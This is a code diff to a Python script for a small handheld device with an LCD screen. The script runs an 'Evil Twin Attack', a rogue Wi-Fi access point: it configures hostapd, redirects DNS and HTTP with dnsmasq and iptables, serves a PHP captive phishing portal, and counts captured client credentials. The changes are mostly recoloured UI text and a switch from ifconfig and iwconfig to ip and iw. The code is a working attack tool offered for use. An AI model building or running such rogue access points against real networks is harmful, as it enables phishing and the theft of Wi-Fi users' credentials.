@@ -197,7 +197,7 @@ signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
 
 def draw_message(lines, color="yellow"):
-    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
     d = ImageDraw.Draw(img)
     font = FONT_TITLE
     y = 40
@@ -211,33 +211,33 @@ def draw_message(lines, color="yellow"):
     LCD.LCD_ShowImage(img, 0, 0)
 
 def draw_ui(screen_state="main", status: str = ""):
-    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
     d = ImageDraw.Draw(img)
 
     if screen_state == "main":
-        d.text((5, 5), "Evil Twin Attack", font=FONT_TITLE, fill="#00FF00")
-        d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
+        d.text((5, 5), "Evil Twin Attack", font=FONT_TITLE, fill=(30, 132, 73))
+        d.line([(0, 22), (128, 22)], fill=(30, 132, 73), width=1)
 
-        d.text((5, 30), f"SSID:", font=FONT_UI, fill="white")
-        d.text((5, 45), FAKE_AP_SSID[:16], font=FONT_TITLE, fill="yellow")
-        d.text((5, 60), f"Channel:", font=FONT_UI, fill="white")
-        d.text((5, 75), FAKE_AP_CHANNEL, font=FONT_TITLE, fill="yellow")
-        d.text((5, 90), f"Portal: {current_html_file}", font=FONT_UI, fill="white")
+        d.text((5, 30), f"SSID:", font=FONT_UI, fill=(242, 243, 244))
+        d.text((5, 45), FAKE_AP_SSID[:16], font=FONT_TITLE, fill=(212, 172, 13))
+        d.text((5, 60), f"Channel:", font=FONT_UI, fill=(242, 243, 244))
+        d.text((5, 75), FAKE_AP_CHANNEL, font=FONT_TITLE, fill=(212, 172, 13))
+        d.text((5, 90), f"Portal: {current_html_file}", font=FONT_UI, fill=(242, 243, 244))
 
-        d.text((5, 105), "OK=Start | KEY1=Edit SSID | KEY2=Edit Channel", font=FONT_UI, fill="cyan")
-        d.text((5, 115), "KEY3=Select Portal", font=FONT_UI, fill="cyan")
+        d.text((5, 105), "OK=Start | KEY1=Edit SSID | KEY2=Edit Channel", font=FONT_UI, fill=(171, 178, 185))
+        d.text((5, 115), "KEY3=Select Portal", font=FONT_UI, fill=(171, 178, 185))
     elif screen_state == "html_select":
-        d.text((5, 5), "Select Portal", font=FONT_TITLE, fill="yellow")
-        d.line([(0, 22), (128, 22)], fill="yellow", width=1)
+        d.text((5, 5), "Select Portal", font=FONT_TITLE, fill=(212, 172, 13))
+        d.line([(0, 22), (128, 22)], fill=(212, 172, 13), width=1)
 
         if not html_files_list:
             d.text((5, 40), "No HTML files found!", font=FONT_UI, fill="red")
         else:
             # Display scroll indicators if needed
             if scroll_offset > 0:
-                d.text((60, 25), "^", font=FONT_UI, fill="white")
+                d.text((60, 25), "^", font=FONT_UI, fill=(242, 243, 244))
             if scroll_offset + VISIBLE_ITEMS < len(html_files_list):
-                d.text((60, 100), "v", font=FONT_UI, fill="white")
+                d.text((60, 100), "v", font=FONT_UI, fill=(242, 243, 244))
 
             for i in range(VISIBLE_ITEMS):
                 if scroll_offset + i < len(html_files_list):
@@ -251,16 +251,16 @@ def draw_ui(screen_state="main", status: str = ""):
                         text_color = "lime"
                         d.rectangle([(0, 35 + i*15), (128, 35 + (i+1)*15)], fill="blue")
                     d.text((5, 35 + i*15), display_name, font=FONT_UI, fill=text_color)
-        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT_UI, fill="cyan")
+        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT_UI, fill=(171, 178, 185))
     elif screen_state == "attacking":
         status_color = "lime" if status == "ACTIVE" else "red"
         d.text((30, 25), status, font=FONT_TITLE, fill=status_color)
 
-        d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT_UI, fill="white")
-        d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT_UI, fill="yellow")
+        d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT_UI, fill=(242, 243, 244))
+        d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT_UI, fill=(212, 172, 13))
         d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT_UI, fill="orange")
 
-        d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill="cyan")
+        d.text((5, 110), "OK=Stop | KEY3=Exit", font=FONT, fill=(171, 178, 185))
     
     LCD.LCD_ShowImage(img, 0, 0)
 
@@ -273,16 +273,16 @@ def handle_text_input_logic(initial_text, input_type, char_set):
     cursor_pos = len(initial_text) - 1
 
     while running:
-        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
+        img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
         d = ImageDraw.Draw(img)
-        d.text((5, 5), f"Enter {input_type}:", font=FONT_TITLE, fill="cyan")
-        d.line([(0, 22), (128, 22)], fill="cyan", width=1)
+        d.text((5, 5), f"Enter {input_type}:", font=FONT_TITLE, fill=(171, 178, 185))
+        d.line([(0, 22), (128, 22)], fill=(171, 178, 185), width=1)
 
         display_text = list(current_value)
         if cursor_pos < len(display_text):
             display_text[cursor_pos] = '_'
-        d.text((5, 40), "".join(display_text[:16]), font=FONT_TITLE, fill="yellow")
-        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
+        d.text((5, 40), "".join(display_text[:16]), font=FONT_TITLE, fill=(212, 172, 13))
+        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill=(171, 178, 185))
         LCD.LCD_ShowImage(img, 0, 0)
 
         last_button_press_time = 0
@@ -466,53 +466,65 @@ def start_attack():
     if os.path.exists(LOOT_FILE):
         os.remove(LOOT_FILE)
 
+    # Detect upstream (internet-facing) interface dynamically
+    upstream = subprocess.run(
+        "ip route | grep '^default' | awk '{print $5}'",
+        shell=True, capture_output=True, text=True
+    ).stdout.strip() or "eth0"
+
     try:
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True) # Removed check=True
-        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True) # Removed check=True
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True) # Removed check=True
-        
+        subprocess.run(f"ip link set {WIFI_INTERFACE} down", shell=True)
+        subprocess.run(f"iw dev {WIFI_INTERFACE} set type ap", shell=True)
+        subprocess.run(f"ip addr flush dev {WIFI_INTERFACE}", shell=True)
+        subprocess.run(f"ip addr add 10.0.0.1/24 dev {WIFI_INTERFACE}", shell=True)
+        subprocess.run(f"ip link set {WIFI_INTERFACE} up", shell=True)
+
         # Enable IP forwarding
         subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True)
-        
+
         # Setup iptables for NAT and DNS redirection
         subprocess.run("iptables -F", shell=True, check=True)
         subprocess.run("iptables -t nat -F", shell=True, check=True)
         subprocess.run("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53", shell=True, check=True)
         subprocess.run("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 80", shell=True, check=True)
-        subprocess.run(f"iptables -A FORWARD -i {WIFI_INTERFACE} -o eth0 -j ACCEPT", shell=True, check=True) # Assuming eth0 is internet-facing
-        subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", shell=True, check=True) # Assuming eth0 is internet-facing
+        subprocess.run(f"iptables -A FORWARD -i {WIFI_INTERFACE} -o {upstream} -j ACCEPT", shell=True, check=True)
+        subprocess.run(f"iptables -t nat -A POSTROUTING -o {upstream} -j MASQUERADE", shell=True, check=True)
 
         cmd_hostapd = f"hostapd {hostapd_conf}"
-        attack_processes['hostapd'] = subprocess.Popen(cmd_hostapd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
+        attack_processes['hostapd'] = subprocess.Popen(
+            cmd_hostapd, shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.PIPE,
+            preexec_fn=os.setsid)
         time.sleep(2)
         if attack_processes['hostapd'].poll() is not None:
             error_msg = attack_processes['hostapd'].stderr.read().decode().strip()
-            print(f"ERROR: hostapd failed to start. Stderr: {error_msg}", file=sys.stderr)
-            draw_message(["ERROR:", f"hostapd failed: {error_msg[:50]}..."], "red")
+            draw_message(["ERROR:", f"hostapd: {error_msg[:50]}"], "red")
             return False
 
-        cmd_dnsmasq = f"dnsmasq -C {dnsmasq_conf} -d"
-        attack_processes['dnsmasq'] = subprocess.Popen(cmd_dnsmasq, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
-        time.sleep(2)
+        # dnsmasq without -d so it daemonises and doesn't block the pipe
+        cmd_dnsmasq = f"dnsmasq -C {dnsmasq_conf}"
+        attack_processes['dnsmasq'] = subprocess.Popen(
+            cmd_dnsmasq, shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid)
+        time.sleep(1)
         if attack_processes['dnsmasq'].poll() is not None:
-            error_msg = attack_processes['dnsmasq'].stderr.read().decode().strip()
-            print(f"ERROR: dnsmasq failed to start. Stderr: {error_msg}", file=sys.stderr)
-            draw_message(["ERROR:", f"dnsmasq failed: {error_msg[:50]}..."], "red")
+            draw_message(["ERROR:", "dnsmasq failed to start"], "red")
             return False
 
         cmd_php = f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}"
-        attack_processes['php'] = subprocess.Popen(cmd_php, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
-        time.sleep(2)
+        attack_processes['php'] = subprocess.Popen(
+            cmd_php, shell=True,
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+            preexec_fn=os.setsid)
+        time.sleep(1)
         if attack_processes['php'].poll() is not None:
-            error_msg = attack_processes['php'].stderr.read().decode().strip()
-            print(f"ERROR: PHP web server failed to start. Stderr: {error_msg}", file=sys.stderr)
-            draw_message(["ERROR:", f"PHP failed: {error_msg[:50]}..."], "red")
+            draw_message(["ERROR:", "PHP server failed to start"], "red")
             return False
-        
+
         return True
     except (subprocess.CalledProcessError, FileNotFoundError) as e:
-        print(f"Error starting attack services: {e}", file=sys.stderr)
-        draw_message(["ERROR:", f"Attack setup failed: {str(e)[:50]}..."], "red")
+        draw_message(["ERROR:", f"Setup failed: {str(e)[:50]}"], "red")
         return False
 
 def stop_attack():
@@ -532,9 +544,9 @@ def stop_attack():
 
     if ORIGINAL_WIFI_INTERFACE:
         draw_message(["Restoring NM..."], "yellow")
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} down 2>/dev/null || true", shell=True)
-        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed 2>/dev/null || true", shell=True)
-        subprocess.run(f"ifconfig {WIFI_INTERFACE} up 2>/dev/null || true", shell=True)
+        subprocess.run(f"ip link set {WIFI_INTERFACE} down 2>/dev/null || true", shell=True)
+        subprocess.run(f"iw dev {WIFI_INTERFACE} set type managed 2>/dev/null || true", shell=True)
+        subprocess.run(f"ip link set {WIFI_INTERFACE} up 2>/dev/null || true", shell=True)
         time.sleep(1)
         
         subprocess.run(f"nmcli device set {ORIGINAL_WIFI_INTERFACE} managed yes 2>/dev/null || true", shell=True)
@@ -574,7 +586,7 @@ if __name__ == "__main__":
         try:
             LCD = LCD_1in44.LCD()
             LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
-            img = Image.new("RGB", (128, 128), "black")
+            img = Image.new("RGB", (128, 128), (10, 0, 0))
             d = ImageDraw.Draw(img)
             FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
             d.text((10, 40), "ERROR:\nRoot privileges\nrequired.", font=FONT_TITLE, fill="red")
